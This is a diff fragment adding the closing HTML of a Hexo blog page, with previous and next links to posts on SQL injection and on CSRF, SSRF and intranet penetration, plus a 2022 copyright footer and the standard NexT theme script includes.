+            <div class="post-nav-item">
+                <a href="/2021/12/16/%E6%B5%85%E5%B0%9Dsql%E6%B3%A8%E5%85%A5/" rel="prev" title="Web安全之注入浅尝">
+                  <i class="fa fa-chevron-left"></i> Web安全之注入浅尝
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/12/27/csrf%E3%80%81ssrf%E5%92%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="next" title="csrf、ssrf和内网渗透">
+                  csrf、ssrf和内网渗透 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">XUE</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
